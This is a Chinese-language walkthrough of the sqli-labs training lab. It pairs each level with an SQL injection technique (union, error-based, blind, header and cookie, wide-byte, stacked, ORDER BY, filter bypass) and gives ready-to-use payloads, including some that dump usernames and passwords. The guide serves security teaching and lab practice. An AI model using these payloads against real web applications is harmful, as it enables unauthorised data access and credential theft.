---
title: sqli-labs通关笔记
---

## 前言

这份文档用于快速把 SQL 注入手法和 sqli-labs 关卡对应起来。

内容包含：

- 每种注入类型对应哪几关
- 每关核心闭合方式
- 通俗概念解释
- 常用测试语句
- 课堂练习顺序

> 以下语句仅用于本地靶场、sqli-labs、测试环境和授权安全测试。

---

# 一、总练习路线

建议按这个顺序刷：

```text
Less-1 ~ Less-4     基础 GET 联合注入
Less-5 ~ Less-6     报错注入
Less-7              文件写入类理解
Less-8              布尔盲注
Less-9 ~ Less-10    时间盲注
Less-11 ~ Less-17   POST 注入
Less-18 ~ Less-19   Header 注入
Less-20 ~ Less-22   Cookie 注入
Less-23 ~ Less-28a  过滤绕过
Less-29 ~ Less-31   WAF / 参数污染
Less-32 ~ Less-37   宽字节注入
Less-38 ~ Less-45   堆叠注入
Less-46 ~ Less-53   Order by 注入
Less-54 ~ Less-65   综合挑战
```

---

# 二、SQL注入基础概念

## 2.1 通俗理解

SQL注入不是“数据库有后门”，而是后端写代码时把用户输入直接拼进SQL里。

正常代码逻辑：

```sql
select * from users where id='1'
```

如果用户输入变成：

```text
1' or '1'='1
```

SQL就变成：

```sql
select * from users where id='1' or '1'='1'
```

`'1'='1'` 永远成立，所以原本只查一个用户，可能变成查询所有用户。

---

## 2.2 判断注入的核心思路

最常见三步：

```text
第一步：加引号，看是否报错
第二步：构造真假条件，看页面是否不同
第三步：根据页面情况选择 union、报错、布尔盲注、时间盲注
```

基础测试：

```http
?id=1'
?id=1 and 1=1
?id=1 and 1=2
?id=1' and '1'='1
?id=1' and '1'='2
```

如果页面对真假条件有不同反应，就说明可能存在注入。

---

# 三、Less-1 到 Less-4：基础 GET 联合注入

## 对应关卡

| 关卡   | 类型           | 闭合方式   | 推荐练习     |
| ------ | -------------- | ---------- | ------------ |
| Less-1 | GET 字符型     | `'`        | 联合查询注入 |
| Less-2 | GET 数字型     | 不需要引号 | 联合查询注入 |
| Less-3 | GET 字符型括号 | `')`       | 联合查询注入 |
| Less-4 | GET 双引号括号 | `")`       | 联合查询注入 |

---

## 3.1 Less-1：单引号字符型注入

### 概念

后端大概率类似：

```sql
select * from users where id='$id' limit 0,1
```

用户传入：

```http
?id=1
```

实际SQL：

```sql
select * from users where id='1' limit 0,1
```

如果传入：

```http
?id=1'
```

SQL变成：

```sql
select * from users where id='1'' limit 0,1
```

多出来一个 `'`，所以数据库报错。

---

### 测试语句

判断注入：

```http
Less-1/?id=1'
```

判断字段数：

```http
Less-1/?id=1' order by 1 --+
Less-1/?id=1' order by 2 --+
Less-1/?id=1' order by 3 --+
Less-1/?id=1' order by 4 --+
```

如果 `order by 3` 正常，`order by 4` 报错，说明字段数是3。

判断回显位：

```http
Less-1/?id=-1' union select 1,2,3 --+
```

爆当前数据库：

```http
Less-1/?id=-1' union select 1,database(),version() --+
```

爆表名：

```http
Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```

爆字段名：

```http
Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```

爆数据：

```http
Less-1/?id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+
```

---

## 3.2 Less-2：数字型注入

### 概念

数字型注入不需要闭合引号。

后端可能是：

```sql
select * from users where id=$id limit 0,1
```

所以直接拼：

```http
?id=1 and 1=1
```

即可。

---

### 测试语句

判断注入：

```http
Less-2/?id=1 and 1=1
Less-2/?id=1 and 1=2
```

判断字段数：

```http
Less-2/?id=1 order by 3 --+
Less-2/?id=1 order by 4 --+
```

联合查询：

```http
Less-2/?id=-1 union select 1,database(),version() --+
```

爆数据：

```http
Less-2/?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --+
```

---

## 3.3 Less-3：单引号加括号闭合

### 概念

后端可能是：

```sql
select * from users where id=('$id') limit 0,1
```

所以必须闭合：

```text
')
```

---

### 测试语句

判断注入：

```http
Less-3/?id=1')
```

联合查询：

```http
Less-3/?id=-1') union select 1,database(),version() --+
```

爆数据：

```http
Less-3/?id=-1') union select 1,group_concat(username,0x3a,password),3 from users --+
```

---

## 3.4 Less-4：双引号加括号闭合

### 概念

后端可能是：

```sql
select * from users where id=("$id") limit 0,1
```

所以闭合方式是：

```text
")
```

---

### 测试语句

判断注入：

```http
Less-4/?id=1")
```

联合查询：

```http
Less-4/?id=-1") union select 1,database(),version() --+
```

爆数据：

```http
Less-4/?id=-1") union select 1,group_concat(username,0x3a,password),3 from users --+
```

---

# 四、Less-5 到 Less-6：报错注入

## 对应关卡

| 关卡   | 类型               | 闭合方式 | 推荐练习                 |
| ------ | ------------------ | -------- | ------------------------ |
| Less-5 | GET 单引号报错注入 | `'`      | updatexml / extractvalue |
| Less-6 | GET 双引号报错注入 | `"`      | updatexml / extractvalue |

---

## 4.1 通俗概念

页面没有正常显示数据库查询结果，但会显示数据库报错。

这时不能靠 union 回显数据，就让数据库“故意报错”，并把想看的数据塞进错误信息里。

报错注入核心逻辑：

```text
查询数据
  ↓
拼接进非法 XPath 参数
  ↓
updatexml / extractvalue 报错
  ↓
错误信息中带出数据
```

---

## 4.2 Less-5 测试语句

判断注入：

```http
Less-5/?id=1'
```

爆当前数据库：

```http
Less-5/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

使用 extractvalue：

```http
Less-5/?id=1' and extractvalue(1,concat(0x7e,database(),0x7e)) --+
```

爆表名：

```http
Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+
```

爆字段名：

```http
Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) --+
```

爆数据：

```http
Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+
```

---

## 4.3 Less-6 测试语句

Less-6 是双引号闭合。

```http
Less-6/?id=1" and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

爆表名：

```http
Less-6/?id=1" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+
```

爆数据：

```http
Less-6/?id=1" and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+
```

---

# 五、Less-8：布尔盲注

## 对应关卡

| 关卡   | 类型         | 闭合方式 | 推荐练习     |
| ------ | ------------ | -------- | ------------ |
| Less-8 | GET 布尔盲注 | `'`      | 页面真假判断 |

---

## 5.1 通俗概念

布尔盲注就是“猜谜”。

页面不显示数据库内容，也不显示报错，但是：

```text
条件为真：页面正常
条件为假：页面异常 / 空白 / 内容不同
```

攻击者就通过一个个真假问题，把数据库内容猜出来。

---

## 5.2 测试语句

判断是否可盲注：

```http
Less-8/?id=1' and 1=1 --+
Less-8/?id=1' and 1=2 --+
```

如果两个页面不同，说明可以布尔盲注。

---

## 5.3 猜数据库长度

```http
Less-8/?id=1' and length(database())=8 --+
```

如果页面正常，说明数据库名长度是8。

---

## 5.4 猜数据库名第一位

```http
Less-8/?id=1' and substr(database(),1,1)='s' --+
```

ASCII写法：

```http
Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+
```

如果页面正常，说明第一位是 `s`。

---

## 5.5 猜表名

```http
Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117 --+
```

---

# 六、Less-9 到 Less-10：时间盲注

## 对应关卡

| 关卡    | 类型               | 闭合方式 | 推荐练习   |
| ------- | ------------------ | -------- | ---------- |
| Less-9  | GET 单引号时间盲注 | `'`      | sleep 延时 |
| Less-10 | GET 双引号时间盲注 | `"`      | sleep 延时 |

---

## 6.1 通俗概念

时间盲注也是猜谜，但页面真假没有明显区别。

所以让数据库帮你“点头”：

```text
条件为真：睡眠5秒
条件为假：立即返回
```

响应慢，说明猜对了。

---

## 6.2 Less-9 测试语句

判断时间盲注：

```http
Less-9/?id=1' and sleep(5) --+
```

严谨判断：

```http
Less-9/?id=1' and if(1=1,sleep(5),0) --+
Less-9/?id=1' and if(1=2,sleep(5),0) --+
```

猜数据库长度：

```http
Less-9/?id=1' and if(length(database())=8,sleep(5),0) --+
```

猜数据库第一位：

```http
Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0) --+
```

---

## 6.3 Less-10 测试语句

Less-10 是双引号闭合：

```http
Less-10/?id=1" and if(1=1,sleep(5),0) --+
```

猜数据库长度：

```http
Less-10/?id=1" and if(length(database())=8,sleep(5),0) --+
```

猜数据库第一位：

```http
Less-10/?id=1" and if(ascii(substr(database(),1,1))=115,sleep(5),0) --+
```

---

# 七、Less-11 到 Less-17：POST 注入

## 对应关卡

| 关卡    | 类型                    | 练习点         |
| ------- | ----------------------- | -------------- |
| Less-11 | POST 单引号联合注入     | 登录框注入     |
| Less-12 | POST 双引号括号注入     | 登录框闭合     |
| Less-13 | POST 单引号括号报错注入 | updatexml      |
| Less-14 | POST 双引号报错注入     | updatexml      |
| Less-15 | POST 单引号布尔盲注     | 页面真假       |
| Less-16 | POST 双引号括号布尔盲注 | 页面真假       |
| Less-17 | UPDATE型报错注入        | 修改密码处注入 |

---

## 7.1 通俗概念

GET注入参数在URL里：

```http
?id=1
```

POST注入参数在请求体里：

```http
uname=admin&passwd=123456
```

本质完全一样，都是参数被拼接进SQL。

---

## 7.2 Less-11 POST 联合注入

登录框输入：

```text
uname=admin' --+
passwd=123456
```

判断是否绕过。

联合查询：

```text
uname=' union select 1,database() --+
passwd=123456
```

如果字段数不对，需要根据页面调整：

```text
uname=' union select 1,2 --+
passwd=123456
```

---

## 7.3 Less-12 双引号括号闭合

测试：

```text
uname=admin") --+
passwd=123456
```

联合查询：

```text
uname=") union select 1,database() --+
passwd=123456
```

---

## 7.4 Less-13 报错注入

```text
uname=admin') and updatexml(1,concat(0x7e,database(),0x7e),1) --+
passwd=123456
```

---

## 7.5 Less-14 双引号报错注入

```text
uname=admin" and updatexml(1,concat(0x7e,database(),0x7e),1) --+
passwd=123456
```

---

## 7.6 Less-15 布尔盲注

```text
uname=admin' and 1=1 --+
passwd=123456
```

```text
uname=admin' and 1=2 --+
passwd=123456
```

猜数据库第一位：

```text
uname=admin' and ascii(substr(database(),1,1))=115 --+
passwd=123456
```

---

## 7.7 Less-16 双引号括号布尔盲注

```text
uname=admin") and 1=1 --+
passwd=123456
```

```text
uname=admin") and ascii(substr(database(),1,1))=115 --+
passwd=123456
```

---

## 7.8 Less-17 UPDATE 报错注入

### 概念

Less-17 重点不是查询，而是修改密码时触发SQL注入。

典型SQL类似：

```sql
update users set password='$passwd' where username='$uname'
```

测试语句一般放在密码字段：

```text
uname=admin
passwd=123456' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

如果页面报出：

```text
XPATH syntax error: '~security~'
```

说明存在 UPDATE 型报错注入。

---

# 八、Less-18 到 Less-19：Header 注入

## 对应关卡

| 关卡    | 注入位置   | 推荐练习        |
| ------- | ---------- | --------------- |
| Less-18 | User-Agent | Header 报错注入 |
| Less-19 | Referer    | Header 报错注入 |

---

## 8.1 通俗概念

很多系统会记录访问日志：

```text
IP
User-Agent
Referer
登录用户名
```

如果这些请求头被写入数据库时直接拼接SQL，就会产生 Header 注入。

---

## 8.2 Less-18 User-Agent 注入

正常请求头：

```http
User-Agent: Mozilla/5.0
```

测试：

```http
User-Agent: test' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1
```

---

## 8.3 Less-19 Referer 注入

正常请求头：

```http
Referer: http://localhost/
```

测试：

```http
Referer: test' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1
```

---

# 九、Less-20 到 Less-22：Cookie 注入

## 对应关卡

| 关卡    | 类型                   | 推荐练习    |
| ------- | ---------------------- | ----------- |
| Less-20 | Cookie 单引号注入      | 报错 / 联合 |
| Less-21 | Cookie Base64 编码注入 | 编码后注入  |
| Less-22 | Cookie 双引号注入      | 报错 / 联合 |

---

## 9.1 通俗概念

Cookie也是用户可控输入。

如果后端这样写：

```sql
select * from users where username='$cookie_user'
```

那攻击者改Cookie，也可以注入。

---

## 9.2 Less-20 测试语句

登录后修改 Cookie，例如：

```http
Cookie: uname=admin'
```

报错注入：

```http
Cookie: uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

---

## 9.3 Less-21 Base64 Cookie 注入

Less-21 的 Cookie 通常经过 Base64 编码。

原始payload：

```text
admin' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

需要先 Base64 编码，再放进 Cookie。

概念重点：

```text
编码不是防御
后端解码后继续拼SQL，照样注入
```

---

## 9.4 Less-22 双引号 Cookie 注入

```http
Cookie: uname=admin" and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

---

# 十、Less-23 到 Less-28a：过滤绕过

## 对应关卡

| 关卡     | 主要过滤点          | 推荐练习        |
| -------- | ------------------- | --------------- |
| Less-23  | 注释符过滤          | 不用注释闭合    |
| Less-24  | 二次注入            | 注册后修改密码  |
| Less-25  | 过滤 or / and       | 双写 / 符号绕过 |
| Less-25a | 数字型过滤绕过      | 过滤关键词      |
| Less-26  | 过滤空格和注释      | 编码 / 括号绕过 |
| Less-26a | 括号场景过滤绕过    | 编码绕过        |
| Less-27  | 过滤 union / select | 大小写 / 双写   |
| Less-27a | 双引号场景过滤绕过  | 双写 / 变形     |
| Less-28  | union select 强过滤 | 双写绕过        |
| Less-28a | 变体绕过            | 组合绕过        |

---

## 10.1 Less-23：注释符过滤

### 概念

常规写法：

```http
?id=1' --+
```

如果注释符被过滤，就不能靠 `--+` 截断后面的SQL。

需要让SQL自己闭合完整。

---

### 测试语句

不用注释的布尔判断：

```http
Less-23/?id=1' and '1'='1
Less-23/?id=1' and '1'='2
```

联合查询：

```http
Less-23/?id=-1' union select 1,database(),'3
```

这里最后的 `'3` 用来补齐后面的单引号。

---

## 10.2 Less-24：二次注入

### 概念

二次注入分两步：

```text
第一步：恶意数据先存进数据库
第二步：系统之后取出来再拼接SQL，触发注入
```

---

### 练习流程

注册用户名：

```text
admin'#
```

密码随意：

```text
123456
```

然后登录这个用户，进入修改密码功能。

后端可能执行：

```sql
update users set password='newpass' where username='admin'#'
```

最终实际影响的是：

```sql
where username='admin'
```

这就是二次注入。

---

## 10.3 Less-25 / Less-25a：过滤 and / or

### 概念

如果过滤：

```text
and
or
```

可以尝试：

```text
&&
||
双写绕过
大小写绕过
```

---

### 测试语句

```http
Less-25/?id=1' && '1'='1' --+
Less-25/?id=1' && '1'='2' --+
```

如果过滤不严格，也可以尝试双写：

```http
Less-25/?id=1' aandnd '1'='1' --+
```

---

## 10.4 Less-26 / Less-26a：过滤空格和注释

### 概念

如果空格被过滤，可以用：

```text
%09
%0a
%0b
%0c
%0d
/**/
括号
```

---

### 测试语句

```http
Less-26/?id=1'%0aand%0a'1'='1
```

联合查询：

```http
Less-26/?id=-1'%0aunion%0aselect%0a1,database(),'3
```

---

## 10.5 Less-27 到 Less-28a：union / select 绕过

### 概念

如果过滤 `union select`，可以尝试：

```text
大小写混淆
双写绕过
内联注释
换行符
```

---

### 测试语句

大小写：

```http
Less-27/?id=-1' UnIoN SeLeCt 1,database(),3 --+
```

双写：

```http
Less-27/?id=-1' uniunionon selselectect 1,database(),3 --+
```

换行：

```http
Less-28/?id=-1')%0aunion%0aselect%0a1,database(),3 --+
```

---

# 十一、Less-29 到 Less-31：WAF / 参数污染

## 对应关卡

| 关卡    | 类型           | 推荐练习 |
| ------- | -------------- | -------- |
| Less-29 | HPP / WAF 绕过 | 参数污染 |
| Less-30 | HPP 双引号     | 参数污染 |
| Less-31 | HPP 双引号括号 | 参数污染 |

---

## 11.1 通俗概念

HPP 是 HTTP Parameter Pollution，参数污染。

例如：

```http
?id=1&id=2
```

某些WAF检查第一个 `id=1`，但后端实际使用第二个 `id=2`。

这就可能造成：

```text
WAF看到的是安全参数
后端执行的是恶意参数
```

---

## 11.2 测试语句

Less-29：

```http
Less-29/?id=1&id=-1' union select 1,database(),3 --+
```

Less-30：

```http
Less-30/?id=1&id=-1" union select 1,database(),3 --+
```

Less-31：

```http
Less-31/?id=1&id=-1") union select 1,database(),3 --+
```

---

# 十二、Less-32 到 Less-37：宽字节注入

## 对应关卡

| 关卡    | 类型                               | 推荐练习   |
| ------- | ---------------------------------- | ---------- |
| Less-32 | GET 宽字节注入                     | `%df'`     |
| Less-33 | 绕过 addslashes                    | `%df'`     |
| Less-34 | POST 宽字节注入                    | 编码绕过   |
| Less-35 | 数字型 / addslashes 失效理解       | 宽字节相关 |
| Less-36 | 绕过 mysql_real_escape_string      | `%df'`     |
| Less-37 | POST 绕过 mysql_real_escape_string | 编码绕过   |

---

## 12.1 通俗概念

普通转义：

```text
' 变成 \'
```

攻击者输入：

```text
%df'
```

转义后字节变成：

```text
%df%5c%27
```

在GBK环境下：

```text
%df%5c
```

可能被识别为一个宽字节字符，反斜杠 `\` 被“吃掉”，剩下的 `'` 重新闭合SQL。

一句话：

```text
宽字节注入不是单引号没被转义
而是反斜杠被前面的宽字节吞掉了
```

---

## 12.2 Less-32 测试语句

判断注入：

```http
Less-32/?id=1%df'
```

联合查询：

```http
Less-32/?id=-1%df' union select 1,database(),version() --+
```

爆数据：

```http
Less-32/?id=-1%df' union select 1,group_concat(username,0x3a,password),3 from users --+
```

---

## 12.3 Less-33 / Less-36 测试语句

```http
Less-33/?id=-1%df' union select 1,database(),version() --+
```

```http
Less-36/?id=-1%df' union select 1,database(),version() --+
```

---

## 12.4 Less-34 / Less-37 POST 宽字节

POST参数中提交：

```text
uname=admin%df' union select 1,database() --+
passwd=123456
```

不同版本可能需要根据字段数调整：

```text
uname=admin%df' union select 1,2 --+
passwd=123456
```

---

# 十三、Less-38 到 Less-45：堆叠注入

## 对应关卡

| 关卡    | 类型               | 推荐练习   |
| ------- | ------------------ | ---------- |
| Less-38 | GET 单引号堆叠注入 | `;` 多语句 |
| Less-39 | GET 数字型堆叠注入 | `;` 多语句 |
| Less-40 | GET 括号堆叠注入   | 闭合括号   |
| Less-41 | GET 数字型盲堆叠   | 多语句     |
| Less-42 | POST 登录堆叠注入  | 登录框     |
| Less-43 | POST 括号堆叠注入  | 登录框     |
| Less-44 | POST 盲堆叠注入    | 无明显回显 |
| Less-45 | POST 复杂闭合堆叠  | 登录框     |

---

## 13.1 通俗概念

普通注入只是在一条SQL里做文章：

```sql
select * from users where id='1'
```

堆叠注入是用分号结束第一条SQL，再写第二条SQL：

```sql
select * from users where id='1'; select database();
```

一句话：

```text
union 是合并查询结果
堆叠是一次执行多条SQL
```

---

## 13.2 Less-38 测试语句

判断是否支持多语句：

```http
Less-38/?id=1'; select sleep(5) --+
```

如果明显延时，说明堆叠语句被执行。

查询型验证：

```http
Less-38/?id=1'; select database() --+
```

在部分页面不显示第二条结果，所以堆叠注入经常结合时间延迟判断。

---

## 13.3 Less-39 数字型堆叠

```http
Less-39/?id=1; select sleep(5) --+
```

---

## 13.4 Less-40 括号闭合

```http
Less-40/?id=1'); select sleep(5) --+
```

---

## 13.5 Less-42 登录框堆叠

在用户名或密码处测试：

```text
login_user=admin'; select sleep(5) --+
login_password=123456
```

或根据具体表单字段调整。

---

# 十四、Less-46 到 Less-53：Order By 注入

## 对应关卡

| 关卡    | 类型                  | 推荐练习  |
| ------- | --------------------- | --------- |
| Less-46 | ORDER BY 数字型报错   | sort参数  |
| Less-47 | ORDER BY 字符型报错   | sort参数  |
| Less-48 | ORDER BY 数字型盲注   | 布尔/时间 |
| Less-49 | ORDER BY 字符型盲注   | 布尔/时间 |
| Less-50 | ORDER BY 数字型堆叠   | 多语句    |
| Less-51 | ORDER BY 字符型堆叠   | 多语句    |
| Less-52 | ORDER BY 数字型盲堆叠 | 多语句    |
| Less-53 | ORDER BY 字符型盲堆叠 | 多语句    |

---

## 14.1 通俗概念

很多业务允许用户控制排序：

```http
?sort=id
?sort=username
?sort=create_time
```

后端可能写成：

```sql
select * from users order by $sort
```

如果 `$sort` 没有白名单限制，就可能注入。

---

## 14.2 Less-46 测试语句

正常访问：

```http
Less-46/?sort=1
```

时间判断：

```http
Less-46/?sort=if(1=1,sleep(5),1)
```

猜数据库第一位：

```http
Less-46/?sort=if(ascii(substr(database(),1,1))=115,sleep(5),1)
```

---

## 14.3 Less-47 字符型 ORDER BY

```http
Less-47/?sort=1' and if(1=1,sleep(5),1) --+
```

或根据页面闭合情况调整：

```http
Less-47/?sort=1' procedure analyse(extractvalue(rand(),concat(0x7e,database())),1) --+
```

---

## 14.4 Less-50 到 Less-53 堆叠型 ORDER BY

Less-50 数字型：

```http
Less-50/?sort=1; select sleep(5) --+
```

Less-51 字符型：

```http
Less-51/?sort=1'; select sleep(5) --+
```

Less-52 数字盲堆叠：

```http
Less-52/?sort=1; select if(length(database())=8,sleep(5),0) --+
```

Less-53 字符盲堆叠：

```http
Less-53/?sort=1'; select if(length(database())=8,sleep(5),0) --+
```

---

# 十五、Less-54 到 Less-65：综合挑战

## 对应关卡

| 关卡    | 主要类型                 | 推荐练习  |
| ------- | ------------------------ | --------- |
| Less-54 | Challenge 联合注入       | 限制次数  |
| Less-55 | Challenge 括号闭合       | 联合注入  |
| Less-56 | Challenge 变形闭合       | 联合注入  |
| Less-57 | Challenge 双引号闭合     | 联合注入  |
| Less-58 | Challenge 报错注入       | updatexml |
| Less-59 | Challenge 数字型报错     | updatexml |
| Less-60 | Challenge 双引号括号报错 | updatexml |
| Less-61 | Challenge 复杂括号报错   | updatexml |
| Less-62 | Challenge 布尔盲注       | 限制次数  |
| Less-63 | Challenge 单引号盲注     | 限制次数  |
| Less-64 | Challenge 括号盲注       | 限制次数  |
| Less-65 | Challenge 双括号盲注     | 限制次数  |

---

## 15.1 通俗概念

这一组不是教新语法，而是考综合判断：

```text
先判断闭合方式
再判断字段数
再判断回显位
再选择 union / 报错 / 盲注
```

核心能力是：

```text
不要背payload
要会判断SQL结构
```

---

## 15.2 Less-54 示例

判断闭合：

```http
Less-54/?id=1'
```

判断字段数：

```http
Less-54/?id=1' order by 3 --+
```

联合查询：

```http
Less-54/?id=-1' union select 1,database(),3 --+
```

---

## 15.3 Less-55 示例

常见闭合为：

```text
)
```

测试：

```http
Less-55/?id=1)
```

联合查询：

```http
Less-55/?id=-1) union select 1,database(),3 --+
```

---

## 15.4 Less-58 报错挑战

```http
Less-58/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

---

## 15.5 Less-62 布尔盲注挑战

判断真假：

```http
Less-62/?id=1' and 1=1 --+
Less-62/?id=1' and 1=2 --+
```

猜数据库长度：

```http
Less-62/?id=1' and length(database())=8 --+
```

猜字符：

```http
Less-62/?id=1' and ascii(substr(database(),1,1))=115 --+
```

---

# 十六、按注入手法快速索引

## 16.1 联合查询注入 Union Based

对应关卡：

```text
Less-1
Less-2
Less-3
Less-4
Less-11
Less-12
Less-20
Less-54
Less-55
Less-56
Less-57
```

核心概念：

```text
页面有数据显示位，就用 union select 把查询结果拼到页面上
```

通用流程：

```http
?id=1' order by 3 --+
?id=-1' union select 1,2,3 --+
?id=-1' union select 1,database(),version() --+
```

---

## 16.2 报错注入 Error Based

对应关卡：

```text
Less-5
Less-6
Less-13
Less-14
Less-17
Less-18
Less-19
Less-20
Less-21
Less-22
Less-58
Less-59
Less-60
Less-61
```

核心概念：

```text
页面不显示查询结果，但显示数据库错误，就把数据塞进错误信息
```

通用语句：

```http
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

---

## 16.3 布尔盲注 Boolean Blind

对应关卡：

```text
Less-8
Less-15
Less-16
Less-48
Less-49
Less-62
Less-63
Less-64
Less-65
```

核心概念：

```text
页面只告诉你对或错，不直接告诉你数据
```

通用语句：

```http
?id=1' and length(database())=8 --+
?id=1' and ascii(substr(database(),1,1))=115 --+
```

---

## 16.4 时间盲注 Time Based

对应关卡：

```text
Less-9
Less-10
Less-15
Less-16
Less-48
Less-49
Less-62
Less-63
Less-64
Less-65
```

核心概念：

```text
页面没区别，就让数据库延迟，用响应时间判断真假
```

通用语句：

```http
?id=1' and if(length(database())=8,sleep(5),0) --+
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0) --+
```

---

## 16.5 二次注入 Second Order

对应关卡：

```text
Less-24
```

核心概念：

```text
第一次提交不触发，恶意数据先入库；
第二次系统读取这个数据再拼SQL，才触发注入。
```

练习流程：

```text
注册用户名：admin'#
登录该用户
进入修改密码
观察 admin 用户密码是否被影响
```

---

## 16.6 宽字节注入 Wide Byte

对应关卡：

```text
Less-32
Less-33
Less-34
Less-35
Less-36
Less-37
```

核心概念：

```text
%df 和反斜杠组合成宽字节字符，吃掉转义符，释放单引号
```

通用语句：

```http
?id=-1%df' union select 1,database(),version() --+
```

---

## 16.7 堆叠注入 Stacked Queries

对应关卡：

```text
Less-38
Less-39
Less-40
Less-41
Less-42
Less-43
Less-44
Less-45
Less-50
Less-51
Less-52
Less-53
```

核心概念：

```text
用分号结束第一条SQL，再执行第二条SQL
```

安全练习语句：

```http
?id=1'; select sleep(5) --+
?id=1; select sleep(5) --+
```

---

## 16.8 Header 注入

对应关卡：

```text
Less-18
Less-19
```

核心概念：

```text
不是只有 URL 参数会注入，请求头也可能被写入数据库
```

测试位置：

```http
User-Agent
Referer
X-Forwarded-For
```

---

## 16.9 Cookie 注入

对应关卡：

```text
Less-20
Less-21
Less-22
```

核心概念：

```text
Cookie 也是用户可控输入，后端拿来拼SQL就会注入
```

测试语句：

```http
Cookie: uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

---

## 16.10 Order By 注入

对应关卡：

```text
Less-46
Less-47
Less-48
Less-49
Less-50
Less-51
Less-52
Less-53
```

核心概念：

```text
排序字段不能直接让用户控制，order by 后面也可能成为注入点
```

测试语句：

```http
?sort=if(ascii(substr(database(),1,1))=115,sleep(5),1)
```

---

# 十七、练习口诀

```text
先看报错，判断闭合；
再看字段，order by 试；
页面有显示，用 union；
页面有报错，用 updatexml；
页面有真假，用布尔盲注；
页面没差异，用 sleep；
参数在 POST，不影响本质；
参数在 Cookie/Header，也一样能注入；
过滤了关键字，就练绕过；
遇到 GBK，就想宽字节；
看到分号多语句，就是堆叠；
看到 sort/order，就想排序注入。
```

---

# 十八、练习建议顺序

## 第一阶段：基础入门

```text
Less-1
Less-2
Less-3
Less-4
```

目标：

```text
掌握闭合方式、字段数、回显位、union select
```

## 第二阶段：无回显场景

```text
Less-5
Less-6
Less-8
Less-9
Less-10
```

目标：

```text
掌握报错注入、布尔盲注、时间盲注
```

## 第三阶段：参数位置变化

```text
Less-11
Less-12
Less-18
Less-19
Less-20
Less-21
Less-22
```

目标：

```text
理解 GET / POST / Header / Cookie 本质一样
```

## 第四阶段：绕过与进阶

```text
Less-23
Less-24
Less-25
Less-26
Less-27
Less-28
Less-32
Less-33
Less-36
```

目标：

```text
掌握过滤绕过、二次注入、宽字节注入
```

## 第五阶段：复杂SQL位置

```text
Less-38
Less-39
Less-46
Less-47
Less-50
Less-51
Less-53
```

目标：

```text
掌握堆叠注入、order by 注入
```

## 第六阶段：综合考核

```text
Less-54 ~ Less-65
```

目标：

```text
脱离固定payload，独立判断闭合方式和注入类型
```
